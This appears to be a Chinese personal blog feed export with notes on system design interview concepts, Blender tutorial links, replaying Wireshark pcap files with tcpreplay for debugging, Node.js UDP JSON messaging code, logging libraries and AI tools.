<p>高可用性是系统持续运行的能力，期望能够长时间保持操作。 高可用性通常以百分比表示，100%意味着服务没有任何停机时间。大多数服务的可用性介于99%到100%之间。</p>
</blockquote>
<blockquote>
<p>服务水平协议（SLA）是服务提供商常用的术语。这是你（服务提供商）与你的客户之间的协议，该协议正式定义了你的服务将提供的运行时间水平。</p>
</blockquote>
<h2 id="第03章：系统设计面试框架"><a href="#第03章：系统设计面试框架" class="headerlink" title="第03章：系统设计面试框架"></a>第03章：系统设计面试框架</h2><h3 id="有效系统设计面试的-4-步流程"><a href="#有效系统设计面试的-4-步流程" class="headerlink" title="有效系统设计面试的 4 步流程"></a>有效系统设计面试的 4 步流程</h3><ul>
<li>第1步 ：了解问题并确定设计范围</li>
<li>第2步：提出高层次的设计方案并获得认同</li>
<li>第3步：深入设计</li>
<li>第4步：总结</li>
</ul>
<h2 id="第04章：设计一个限流器"><a href="#第04章：设计一个限流器" class="headerlink" title="第04章：设计一个限流器"></a>第04章：设计一个限流器</h2><blockquote>
<p>在网络系统中，限流器被用于控制客户端或服务端发送流量的速率。在HTTP世界中，限流器限制在指定时间内允许发送客户端请求数。 如果API请求次数超过了限流器设置的阈值，则所有超出的调用都会被阻止。</p>
</blockquote>
<h3 id="限流算法"><a href="#限流算法" class="headerlink" title="限流算法"></a>限流算法</h3><p>流行算法的列表：</p>
<ul>
<li><p>令牌桶（Token bucket）</p>
</li>
<li><p>漏桶算法（Leaking bucket）</p>
</li>
<li><p>固定窗口计数器（Fixed window counter）</p>
</li>
<li><p>滑动窗口日志（Sliding window log）</p>
</li>
<li><p>滑动窗口计数器（Sliding window counter）</p>
</li>
</ul>
<h2 id="第05章：一致性hash设计"><a href="#第05章：一致性hash设计" class="headerlink" title="第05章：一致性hash设计"></a>第05章：一致性hash设计</h2><blockquote>
<p>为了实现水平扩展，在服务器之间高效、均匀地分配请求/数据非常重要。一致哈希是实现这一目标的常用技术。</p>
<p>引用自维基百科：“一致性哈希是一种特殊的哈希，当重新调整哈希表的大小并使用一致性哈希时，平均只需要重新映射 k/n 个键，其中<br>k 是键的数量，n 是槽的数量。 相比之下，在大多数传统的哈希表中，数组槽数量的变化导致几乎所有键都被重新映射 [1]”</p>
</blockquote>
<h2 id="第06章：key-value-存储设计"><a href="#第06章：key-value-存储设计" class="headerlink" title="第06章：key-value 存储设计"></a>第06章：key-value 存储设计</h2><blockquote>
<p>分布式键值存储也称为分布式哈希表，它将键值对分布在许多服务器上。在设计分布式系统时，了解 CAP（C一致性、A可用性、P分区容错性）定理很重要。</p>
</blockquote>
<blockquote>
<p>CAP 定理指出，分布式系统不可能同时提供以下三种保证中的两种以上：一致性、可用性和分区容错性。让我们熟悉一些定义。</p>
</blockquote>
<ul>
<li><p>一致性：一致性意味着所有客户端无论连接到哪个节点，都在同一时间看到相同的数据。</p>
</li>
<li><p>可用性：可用性意味着即使某些节点已关闭，任何请求数据的客户端都会得到响应。</p>
</li>
<li><p>分区容忍度：分区表示两个节点之间的通信中断，分区容错意味着系统在网络分区的情况下继续运行。</p>
</li>
</ul>
<blockquote>
<p>CAP 定理指出，必须牺牲三个属性之一来支持 3 个属性中的 2 个。</p>
</blockquote>
<h2 id="第07章：分布式系统中设计唯一-ID-生成器"><a href="#第07章：分布式系统中设计唯一-ID-生成器" class="headerlink" title="第07章：分布式系统中设计唯一 ID 生成器"></a>第07章：分布式系统中设计唯一 ID 生成器</h2><p>可以使用多个选项在分布式系统中生成唯一ID。</p>
<ul>
<li>多主复制</li>
<li>通用唯一标识符 (UUID)</li>
<li>Ticket 服务器</li>
<li>推特雪花算法</li>
</ul>
<h2 id="第08章：短网址设计"><a href="#第08章：短网址设计" class="headerlink" title="第08章：短网址设计"></a>第08章：短网址设计</h2><p>短网址设计概念: 假设 URL <a href="https://www.systeminterview.com/q=chatsystem&amp;c=loggedin&amp;v=v3&amp;l=long" target="_blank" rel="noopener">https://www.systeminterview.com/q=chatsystem&amp;c=loggedin&amp;v=v3&amp;l=long</a> 是原始 URL。你的服务创建了一个长度较短的别名：<a href="https://tinyurl.com/y7keocwj。如果你单击较短的别名URL，它会将你重定向到原始" target="_blank" rel="noopener">https://tinyurl.com/y7keocwj。如果你单击较短的别名URL，它会将你重定向到原始</a> URL。</p>
<ul>
<li><p>301重定向。301重定向表明，请求的URL被 “永久 “地移到了长URL上。由于是永久重定向，浏览器会缓存响应，对同一URL的后续请求将不会被发送到URL缩短服务上。相反，请求将直接被重定向到长网址服务器。</p>
</li>
<li><p>302重定向。302重定向意味着URL被 “暂时 “移到长URL上，这意味着对同一URL的后续请求将首先被发送到URL缩短服务上。然后，它们会被重定向到长网址服务器。</p>
</li>
<li><p>哈希+碰撞解决</p>
</li>
<li><p>base 62 转换</p>
</li>
</ul>
<h2 id="第09章：网络爬虫设计"><a href="#第09章：网络爬虫设计" class="headerlink" title="第09章：网络爬虫设计"></a>第09章：网络爬虫设计</h2><blockquote>
<p>网络爬虫被称为机器人或蜘蛛。搜索引擎广泛使用它来发现 Web 上的新内容或更新内容。内容可以是网页、图像、视频、PDF 文件等。</p>
</blockquote>
<h2 id="第10章：设计一个通知系统"><a href="#第10章：设计一个通知系统" class="headerlink" title="第10章：设计一个通知系统"></a>第10章：设计一个通知系统</h2><p>近年来，通知系统已经成为许多应用程序非常流行的功能。 通知提醒用户重要信息，如突发新闻、产品更新、活动、优惠等。</p>
<h2 id="第11章：设计一个新闻提要系统"><a href="#第11章：设计一个新闻提要系统" class="headerlink" title="第11章：设计一个新闻提要系统"></a>第11章：设计一个新闻提要系统</h2><blockquote>
<p>什么是信息推送？ 根据 Facebook 帮助页面，“动态是位于首页中间不断更新的动态列表。动态包括您在 Facebook 上关注的用户、公共主页和小组发布的状态更新、照片、视频、链接、应用事件和点赞。”</p>
</blockquote>
<ul>
<li><p>信息发布（Feed publishing）：当用户发布帖子时，相应的数据被写入缓存和数据库。帖子被推送到她朋友的动态中。</p>
</li>
<li><p>信息流构建（Newsfeed building）：为简单起见，我们假设信息推送是通过按时间倒序聚合朋友的帖子来构建的。</p>
</li>
</ul>
<blockquote>
<p>Fanout 是将帖子传递给所有朋友的过程。两种类型的扇出模型是：写扇出（也称为推模型）和读扇出（也称为拉模型）。两种模型各有利弊。</p>
</blockquote>
<h2 id="第12章：设计一个聊天系统"><a href="#第12章：设计一个聊天系统" class="headerlink" title="第12章：设计一个聊天系统"></a>第12章：设计一个聊天系统</h2><blockquote>
<p>当发送方通过聊天服务向接收方发送消息时，它使用久经考验的 HTTP 协议，这是最常见的 Web 协议。在此场景中，客户端打开与聊天服务的 HTTP 连接并发送消息，通知服务将消息发送给接收者。 Keep-Alive 对此很有效，因为 Keep-Alive 标头允许客户端与聊天服务保持持久连接。 它还减少了 TCP 握手的次数。</p>
</blockquote>
<blockquote>
<p>由于HTTP是由客户发起的，因此从服务器发送消息并非易事。多年来，许多技术被用来模拟服务器发起的连接：轮询（Polling）、长轮询（Long polling）和 WebSocket。</p>
</blockquote>
<blockquote>
<p>图12-9显示了1对1聊天的消息表。主键是 message_id ，它有助于决定消息的顺序。我们不能依靠 created_at 来决定消息的顺序，因为两条消息可以同时创建。</p>
</blockquote>
<blockquote>
<p>定期地，一个在线客户端向状态服务器发送一个心跳事件。如果状态服务器在一定时间内收到心跳事件，比如说来自客户端的X秒，那么用户被认为是在线的。否则，它就处于离线状态。</p>
</blockquote>
<h2 id="第13章：设计一个搜索自动完成系统"><a href="#第13章：设计一个搜索自动完成系统" class="headerlink" title="第13章：设计一个搜索自动完成系统"></a>第13章：设计一个搜索自动完成系统</h2><blockquote>
<p>当你在谷歌上搜索或在亚马逊购物时，在搜索框中输入，会有一个或多个与搜索词相匹配的内容呈现给你。这一功能被称为自动完成、提前输入、边输入边搜索或增量搜索。</p>
</blockquote>
<blockquote>
<p>trie 的主要思想包括以下内容：</p>
</blockquote>
<ul>
<li><p>trie是一种树状的数据结构。</p>
</li>
<li><p>根代表一个空字符串。</p>
</li>
<li><p>每个节点存储一个字符并有 26 个子节点，每个节点对应一个可能的字符。 为了节省空间，我们不绘制空链接。</p>
</li>
<li><p>每个树节点代表一个单词或一个前缀字符串。</p>
</li>
</ul>
<h2 id="第14章：设计-YouTube"><a href="#第14章：设计-YouTube" class="headerlink" title="第14章：设计 YouTube"></a>第14章：设计 YouTube</h2><blockquote>
<p>当你在YouTube上观看一个视频时，它通常立即开始流媒体，你不会等到整个视频被下载。下载意味着整个视频被复制到你的设备上，而流媒体意味着你的设备不断接收来自远程源视频的视频流。当你观看流媒体视频时，你的客户端每次加载一点数据，所以你可以立即和连续地观看视频。</p>
</blockquote>
<blockquote>
<p>流媒体协议。这是一种控制视频流数据传输的标准化方式。流行的流媒体协议有：</p>
</blockquote>
<ul>
<li><p>MPEG–DASH：MPEG代表 “移动图像专家组”，DASH代表 “HTTP动态自适应流”。</p>
</li>
<li><p>苹果 HLS：HLS是 “HTTP实时流媒体 “的缩写。</p>
</li>
<li><p>微软 Smooth Streaming。</p>
</li>
<li><p>Adobe HTTP动态流（HDS）。</p>
</li>
</ul>
<blockquote>
<p>Facebook的流媒体视频引擎使用了一个有向无环图（DAG）编程模型，它分阶段定义任务，因此它们可以顺序或平行地执行。</p>
</blockquote>
<h2 id="第15章：设计-Google-Drive"><a href="#第15章：设计-Google-Drive" class="headerlink" title="第15章：设计 Google Drive"></a>第15章：设计 Google Drive</h2><blockquote>
<p>Google Drive 是一种文件存储和同步服务，可帮助您在云端存储文档、照片、视频和其他文件。您可以从任何计算机、智能手机和平板电脑访问您的文件。你可以轻松地与朋友、家人和同事共享这些文件。</p>
</blockquote>
<ul>
<li>上传流程</li>
<li>下载流程</li>
</ul>
<h1 id="系统设计面试：内幕指南读书笔记（第二卷）"><a href="#系统设计面试：内幕指南读书笔记（第二卷）" class="headerlink" title="系统设计面试：内幕指南读书笔记（第二卷）"></a>系统设计面试：内幕指南读书笔记（第二卷）</h1><h2 id="第01章：邻近服务"><a href="#第01章：邻近服务" class="headerlink" title="第01章：邻近服务"></a>第01章：邻近服务</h2><blockquote>
<p>附近地点服务用于发现附近的餐厅、酒店、剧院、博物馆等场所，是一个核心组件，为 Yelp 上查找附近最佳餐厅或 Google 地图上查找最近加油站等功能提供支持。</p>
</blockquote>
<blockquote>
<p>LBS服务(基于位置的服务)是系统的核心部分，用于在给定半径和位置范围内查找附近的商家。</p>
</blockquote>
<blockquote>
<p>从广义上讲，有两种类型的地理空间索引方法，如图1.5所示。</p>
</blockquote>
<ul>
<li>Hash: 均匀网格、geohash、笛卡尔层等。</li>
<li>Tree: 四叉树、Google S2、R树等。</li>
</ul>
<h2 id="第02章：附近的好友"><a href="#第02章：附近的好友" class="headerlink" title="第02章：附近的好友"></a>第02章：附近的好友</h2><blockquote>
<p>对于选择加入并授予位置访问权限的用户，移动客户端会显示地理位置上靠近的好友列表。</p>
</blockquote>
<h2 id="第10章-实时游戏排行榜"><a href="#第10章-实时游戏排行榜" class="headerlink" title="第10章 实时游戏排行榜"></a>第10章 实时游戏排行榜</h2><blockquote>
<p>什么是排行榜？排行榜在游戏和其他领域很常见，用于显示谁在特定的赛季或比赛对局中领先。用户在完成任务或挑战后会被分配分数，分数最高的用户就会在排行榜上名列前茅。</p>
</blockquote>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://learning-guide.gitbook.io/system-design-interview" target="_blank" rel="noopener">系统设计面试：内幕指南</a>,by Alex Xu.</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>Blender实践教程</title>
    <url>/2024/11/23/Blender%E5%AE%9E%E8%B7%B5%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<p>记录各种使用Blender过程中遇到的问题。</p>
<h1 id="基本常识"><a href="#基本常识" class="headerlink" title="基本常识"></a>基本常识</h1><p>具体请参考：</p>
<ul>
<li><a href="https://tieba.baidu.com/p/8215364033#:~:text=%E4%B8%8D%E6%98%AF%E5%9D%90%E6%A0%87%E8%BD%B4%EF%BC%8C%E6%98%AF%E7%A9%BA%E7%89%A9%E4%BD%93%EF%BC%8C%E9%81%BF%E5%85%8D%E5%88%86%E4%BB%B6%E4%BD%8D%E7%BD%AE%E9%94%99%E4%BD%8D%E7%9A%84%E3%80%82,%E9%BB%91%E7%BA%BF%E6%98%AF%E7%88%B6%E7%BA%A7%E5%85%B3%E7%B3%BB%E3%80%82%20%E5%9C%A8%E7%88%B6%E7%BA%A7%E9%87%8C%E5%88%A0%E6%8E%89%E5%B0%B1%E5%8F%AF%E4%BB%A5%E4%BA%86" target="_blank" rel="noopener">有大佬知道这些连着模型的黑线是啥吗,绑定父级的连接线</a></li>
<li><a href="https://blog.51cto.com/zhaoqingqing/3145558" target="_blank" rel="noopener">在3D Max中查看模型引用的贴图</a></li>
<li><a href="https://www.bilibili.com/video/BV1944y1R7NV/?vd_source=1c1141bd350722c46f198cb1adc34fc4" target="_blank" rel="noopener">UV是什么以及如何查看、编辑3DMAX模型UV？</a></li>
<li><a href="https://docs.blender.org/manual/zh-hans/latest/render/materials/assignment.html" target="_blank" rel="noopener">材质槽</a></li>
<li><a href="https://ar-code.com/cn/blog/%E8%A7%86%E9%A2%91%E6%95%99%E7%A8%8B-%E5%A6%82%E4%BD%95%E5%9C%A8-blender-%E4%B8%AD%E5%8E%8B%E7%BC%A9-%E5%87%8F%E5%B0%8F-3d-%E6%A8%A1%E5%9E%8B%E7%9A%84%E5%A4%A7%E5%B0%8F-glb-gltf-dae-fbx-obj" target="_blank" rel="noopener">视频教程：如何在Blender中压缩/减少3D模型的大小（GLB、GLTF、DAE、FBX、OBJ…）？</a></li>
</ul>
<h1 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h1><p>具体请参考：</p>
<ul>
<li><a href="https://blog.csdn.net/yuantingfei/article/details/130983699" target="_blank" rel="noopener">Blender设置物体的旋转中心点</a></li>
<li><a href="https://blog.csdn.net/qq_16599281/article/details/128780242" target="_blank" rel="noopener">Blender大纲视图中显示的空物体</a></li>
<li><a href="https://docs.blender.org/manual/zh-hans/dev/scene_layout/object/tools/tool_settings.html#bpy-types-toolsettings-use-transform-data-origin" target="_blank" rel="noopener">Blender仅影响原点</a></li>
<li><a href="https://docs.blender.org/manual/zh-hans/2.80/scene_layout/object/selecting.html" target="_blank" rel="noopener">选中或隐藏物体</a></li>
<li><a href="https://blog.csdn.net/fb_help/article/details/112723254" target="_blank" rel="noopener">给模型添加纹理–blender</a></li>
<li><a href="https://blog.csdn.net/qq_42720695/article/details/138911841" target="_blank" rel="noopener">Blender雕刻建模_笔刷纹理和顶点绘制</a></li>
<li><a href="https://blog.csdn.net/u012204304/article/details/111028811" target="_blank" rel="noopener">Blender：着色器编辑器</a></li>
<li><a href="https://jingyan.baidu.com/article/a948d65129edd90a2dcd2eb7.html" target="_blank" rel="noopener">blender切换并锁定到摄像机视图</a></li>
<li><a href="https://jingyan.baidu.com/article/e4d08ffdf748454ed3f60d52.html" target="_blank" rel="noopener">blender着色编辑器的使用方法介绍</a></li>
<li><a href="https://jingyan.baidu.com/article/6fb756ec86be0d651858fba2.html" target="_blank" rel="noopener">blender中怎么将两个物体合成一个整体</a></li>
</ul>
<h1 id="材质"><a href="#材质" class="headerlink" title="材质"></a>材质</h1><ul>
<li>漫反射颜色： 让渲染物体表面颜色更丰富真实，是环境颜色反射到物体上的</li>
<li>高光级别： 那就是看这个物体到底是像汽车一样很亮，还是像鸡蛋一样高光比较弱</li>
<li>光泽度： 那就是这是一个瓷杯子很光滑，还是桌子感觉有摩擦，或者一块砖头非常粗糙</li>
<li>自发光： 那就是像荧光板一样，自己在发亮，但是不是灯一样，照亮周围的所有东西</li>
<li>不透明： 那就是水、玻璃透明，冰块半透明，鸡蛋液体透光，瓷杯子子盘子、铁、木头、都不透明</li>
</ul>
<p>这些东西共同控制了 一个物体给人材质的感觉，让软件里面做的东西，看起来更像真实的物体。</p>
<p>具体请参考：</p>
<ul>
<li><a href="https://zh.wikipedia.org/wiki/%E6%B3%95%E7%BA%BF%E8%B4%B4%E5%9B%BE" target="_blank" rel="noopener">法线贴图</a></li>
<li><a href="https://help.autodesk.com/view/3DSMAX/2024/CHS/?guid=GUID-C65DE825-BAB0-4CDA-82E2-CCE1EAFAFAC5" target="_blank" rel="noopener">反射贴图</a></li>
<li><a href="https://www.tuituisoft.com/shinei/118374.html" target="_blank" rel="noopener">3DMax反射光泽度一般是多少？</a></li>
<li><a href="https://www.bilibili.com/opus/511526769547857420" target="_blank" rel="noopener">Blender基础材质笔记</a></li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/yuantingfei/article/details/130983699" target="_blank" rel="noopener">Blender设置物体的旋转中心点</a>,by ftytotop.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
      </tags>
  </entry>
  <entry>
    <title>Wireshark之pcap文件流量回放的方法</title>
    <url>/2024/11/25/Wireshark%E4%B9%8Bpcap%E6%96%87%E4%BB%B6%E6%B5%81%E9%87%8F%E5%9B%9E%E6%94%BE%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>应公司要求编写了一个流量转发加消息格式转换的程序，但是老是报错。于是使用 wireshark 抓包保存成 pcap 文件，然后想通过流量回放复现程序报错原因。下面研究一下流量回放的方法。</p>
<h1 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h1><h2 id="tcpreplay"><a href="#tcpreplay" class="headerlink" title="tcpreplay"></a>tcpreplay</h2><blockquote>
<p>tcpreplay是一款强大的网络数据包重放工具，它可以将捕获到的网络流量（通常是pcap格式的文件）重新重放到网络中，实现对网络通信的重现。这在网络故障排查、安全测试、性能测试、开发调试等场景下具有广泛的应用。同时，tcpreplay不仅仅能重放TCP协议报文，它支持重放所有协议报文，同时支持IPv4和IPv6协议栈，不要被命名误导了，类比tcpdump的命名，tcpdump也能抓取所有协议报文而不仅仅是TCP。</p>
</blockquote>
<p>TCPReplay包含几个核心组件和功能：</p>
<ul>
<li>tcpreplay，将捕获的网络流量（pcap文件）重放回网络，可控制重放速度、循环次数、输出接口等。 </li>
<li>tcprewrite，修改pcap文件中的数据包内容，例如修改IP地址、端口号、MAC地址等，用于模拟不同的网络环境或进行安全测试。</li>
<li>tcpprep，将pcap文件中的数据包按照客户端和服务器进行分类，为后续的重放做准备。可提高重放效率，特别是对于大型pcap文件。</li>
<li>tcpbridge，在两个网络之间建立桥接，将修改后的流量转发到不同的网络。从而实现网络流量的隔离和转发。</li>
<li>tcpcapinfo，对pcap文件进行解码和调试。可用于分析pcap文件的内容，检查数据包的格式和内容。</li>
</ul>
<h1 id="回放操作"><a href="#回放操作" class="headerlink" title="回放操作"></a>回放操作</h1><p>在进行重放之前，最好能预先确认是将整个pcap文件重放，还是有选择性的筛选特定报文再重放。</p>
<h2 id="完整重放"><a href="#完整重放" class="headerlink" title="完整重放"></a>完整重放</h2><p>具体步骤如下：</p>
<ul>
<li>使用 wireshark 或 tcpdump 抓包，生成 pcap 文件</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tcpdump -i eth0 -nn host 192.168.1.8 and \( tcp port 80 or icmp \) -v -w client.pcap</span><br></pre></td></tr></table></figure>

<ul>
<li>针对TCP流量，更新下client.pcap报文中TCP下的checksum校验和，并输出为client_fix.pcap。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tcprewrite --infile&#x3D;client.pcap --outfile&#x3D;client_fix.pcap --fixcsum</span><br></pre></td></tr></table></figure>

<p>校验和（checksum）是通过对数据进行计算得到的一个数值，发送方和接收方会对相同的数据计算出相同的校验和。如果接收方计算出的校验和与发送方提供的校验和不一致，就说明数据在传输过程中发生了错误，接收方会丢弃该数据包，比如不做csum更新的话，对端收到重放包，校验不对，是不会正常响应的，直接丢弃掉：</p>
<ul>
<li>完整回放 pcap 文件</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tcpreplay -v -t -i eth0 client_fix.pcap #-v参数可以看到重放的每一帧的细节；-t参数尽可能快的重放数据包</span><br></pre></td></tr></table></figure>

<h2 id="筛选重放"><a href="#筛选重放" class="headerlink" title="筛选重放"></a>筛选重放</h2><p>具体步骤如下：</p>
<ul>
<li>筛选 pcap 文件。</li>
</ul>
<p>Wireshark直接输入过滤表达式后，在左上角选项栏点击 文件（File）–&gt; 导出特定分组（Export Specified Packets）即可。</p>
<ul>
<li>修改 pcap 文件的 ip 和 mac 。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tcprewrite --infile&#x3D;client_src.pcap --outfile&#x3D;client_src_rewrite.pcap -S 0.0.0.0&#x2F;0:192.168.1.12 -D 0.0.0.0&#x2F;0:192.168.1.72 --enet-smac&#x3D;00:50:56:81:8e:44 --enet-dmac&#x3D;00:50:56:81:be:58</span><br></pre></td></tr></table></figure>

<ul>
<li>流量回放</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/zhuxian2009/article/details/120841057" target="_blank" rel="noopener">pcap回放——tcpreplay</a>,by zhuxian2009.</li>
<li><a href="https://cloud.tencent.com/developer/article/2454453" target="_blank" rel="noopener">TCPreplay网络报文/流量重放实战指南： PCAP包的重写与重放</a>,by RokasYang.</li>
<li><a href="https://mozillazg.com/2015/05/open-tcpdump-result-with-wireshark-gui.html" target="_blank" rel="noopener">使用 wireshark 查看 tcpdump 的抓包结果</a>,by mozillazg.</li>
<li><a href="https://cloud.tencent.com/developer/article/1479433" target="_blank" rel="noopener">Linux下Pcap包重放工具Tcpreplay的简单使用</a>,by yuanfan2012.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>常用工具</tag>
        <tag>计算机安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Nodejs使用UDP通信传输JSON数据的方法</title>
    <url>/2024/12/02/Nodejs%E4%BD%BF%E7%94%A8UDP%E9%80%9A%E4%BF%A1%E4%BC%A0%E8%BE%93JSON%E6%95%B0%E6%8D%AE%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>最近需要在Nodejs平台上使用UDP协议接收JSON数据，于是研究一下。</p>
<h1 id="UDP服务器端代码"><a href="#UDP服务器端代码" class="headerlink" title="UDP服务器端代码"></a>UDP服务器端代码</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * UDP服务端</span><br><span class="line"> *&#x2F;</span><br><span class="line">&#x2F;&#x2F;载入udp模块</span><br><span class="line">const dgram &#x3D; require(&quot;dgram&quot;);</span><br><span class="line">&#x2F;&#x2F;创建服务器</span><br><span class="line">const server &#x3D; dgram.createSocket(&quot;udp4&quot;);</span><br><span class="line"> </span><br><span class="line">server.on(&quot;message&quot;,(msg,rinfo)&#x3D;&gt;&#123;</span><br><span class="line">    &#x2F;&#x2F;将接收到的消息返回客户端</span><br><span class="line">    var strmsg &#x3D; &quot;你好，UDP客户端，消息已经收到！&quot;;</span><br><span class="line">    server.send(strmsg,rinfo.port,rinfo.address);</span><br><span class="line">    let jsonData&#x3D;JSON.parse(msg)</span><br><span class="line">    console.log(&quot;服务器接收到来自&quot;+rinfo.address+&quot;:&quot;+rinfo.port+&quot; 的消息：&quot;+jsonData.hello);</span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line">server.on(&quot;listening&quot;,()&#x3D;&gt;&#123;</span><br><span class="line">    let adress &#x3D; server.address();</span><br><span class="line">    console.log(&quot;服务器监听：&quot;,adress.adress+&quot;:&quot;+adress.port);</span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line">server.on(&quot;error&quot;,(err)&#x3D;&gt;&#123;</span><br><span class="line">    console.err(&quot;服务器异常错误：&quot;+err.message);</span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line">server.bind(8234,&quot;127.0.0.1&quot;);</span><br></pre></td></tr></table></figure>

<h1 id="UDP客户端代码"><a href="#UDP客户端代码" class="headerlink" title="UDP客户端代码"></a>UDP客户端代码</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * UDP客户端</span><br><span class="line"> *&#x2F;</span><br><span class="line">const dgram &#x3D; require(&quot;dgram&quot;);</span><br><span class="line"> </span><br><span class="line">const client &#x3D; dgram.createSocket(&quot;udp4&quot;);</span><br><span class="line"> </span><br><span class="line">client.on(&quot;message&quot;,(msg,rinfo)&#x3D;&gt;&#123;</span><br><span class="line">    console.log(&quot;接收来自：&quot;+rinfo.address+&quot;:&quot;+rinfo.port+&quot;的消息：&quot;+msg.toString());</span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line">client.on(&quot;error&quot;,(err)&#x3D;&gt;&#123;</span><br><span class="line">  console.error(&quot;客户端错误：&quot;+err.message);</span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line">client.on(&quot;close&quot;,()&#x3D;&gt;&#123;</span><br><span class="line">    console.log(&quot;socket已关闭&quot;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">let jsonData&#x3D;&#123;</span><br><span class="line">    hello: &quot;我是UDP客户端！&quot;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">client.send(JSON.stringify(jsonData),8234,&quot;127.0.0.1&quot;,(err)&#x3D;&gt;&#123;</span><br><span class="line">    if(err) client.close();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://cloud.tencent.com/developer/article/2079197" target="_blank" rel="noopener">Node js 开发入门 —UDP 编程，小白也能轻松学会</a>,by crmeb.</li>
<li><a href="https://blog.csdn.net/caofengtao1314/article/details/117063590" target="_blank" rel="noopener">UDP 报文最大可以是多大呢</a>,by cft56200_ln.</li>
<li><a href="https://blog.csdn.net/u011555996/article/details/126960232" target="_blank" rel="noopener">UDP传输报文大小详解</a>,by luckyone906.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title>Nodejs日志管理的方法</title>
    <url>/2024/12/02/Nodejs%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>使用日志是回溯问题发现问题的重要方法，是服务器端应用运维的基础设施。下面研究一下常用的Nodejs 日志库。</p>
<h1 id="常用日志库"><a href="#常用日志库" class="headerlink" title="常用日志库"></a>常用日志库</h1><ul>
<li>Winston ：灵活的通用日志库</li>
<li>Morgan ： HTTP请求记录器中间件</li>
<li>Pino：超快（非常低的开销），纯原生 JSON 记录器</li>
<li>Loglevel：JavaScript最小的轻量级简单日志记录</li>
<li>log4js ：没有运行时依赖的日志框架</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://juejin.cn/post/7017811851345920037" target="_blank" rel="noopener">Node.js 日志最佳实践指南</a>,by 天行无忌.</li>
<li><a href="https://blog.csdn.net/m0_37263637/article/details/80328505" target="_blank" rel="noopener">Nodejs log方案(log4js)</a>,by Andy____Li.</li>
<li><a href="https://juejin.cn/post/6953160430785151007" target="_blank" rel="noopener">Node log4js日志管理</a>,by junyang.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title>好用的AI工具记录</title>
    <url>/2024/12/03/%E5%A5%BD%E7%94%A8%E7%9A%84AI%E5%B7%A5%E5%85%B7%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>AI工具可以工作效率，快速交付成果，值得使用。下面记录一下常用的AI工具。</p>
<h1 id="文本到文本"><a href="#文本到文本" class="headerlink" title="文本到文本"></a>文本到文本</h1><h2 id="ChatGPT"><a href="#ChatGPT" class="headerlink" title="ChatGPT"></a>ChatGPT</h2><p>ChatGPT，全称聊天生成预训练转换器（英语：Chat Generative Pre-trained Transformer），是OpenAI开发的人工智能聊天机器人程序，于2022年12月推出。该程序使用基于GPT-3.5、GPT-4、GPT-4o架构的大型语言模型并以强化学习训练。ChatGPT目前仍以文字方式交互，而除了可以用人类自然对话方式来交互，还可以用于甚为复杂的语言工作，包括自动生成文本、自动问答、自动摘要等多种任务。如：在自动文本生成方面，ChatGPT可以根据输入的文本自动生成类似的文本（剧本、歌曲、企划等），在自动问答方面，ChatGPT可以根据输入的问题自动生成答案。还有编写和调试计算机程序的能力。</p>
<h1 id="文本到图像"><a href="#文本到图像" class="headerlink" title="文本到图像"></a>文本到图像</h1><h2 id="DALL-E"><a href="#DALL-E" class="headerlink" title="DALL-E"></a>DALL-E</h2><p>DALL-E是一个可以通过文本描述生成图像的人工智能程序，于2021年1月5日由OpenAI发布。</p>
<p>DALL-E通过120亿参数版本的GPT-3 Transformer模型来理解自然语言输入（例如“五边形形状的绿色皮革钱包”或“一只悲伤水豚的等距视图”）并生成相应的图片。它既可以生成现实的对象（例如“带有蓝色草莓图像的彩色玻璃窗”），也能够生成现实中不存在的对象（例如“具有豪猪纹理的立方体”）。</p>
<h2 id="Stable-Diffusion"><a href="#Stable-Diffusion" class="headerlink" title="Stable Diffusion"></a>Stable Diffusion</h2><p>Stable Diffusion是2022年发布的深度学习文本到图像生成模型。它主要用于根据文本的描述产生详细图像，尽管它也可以应用于其他任务，如内补绘制、外补绘制，以及在提示词指导下产生图生图的转变。</p>
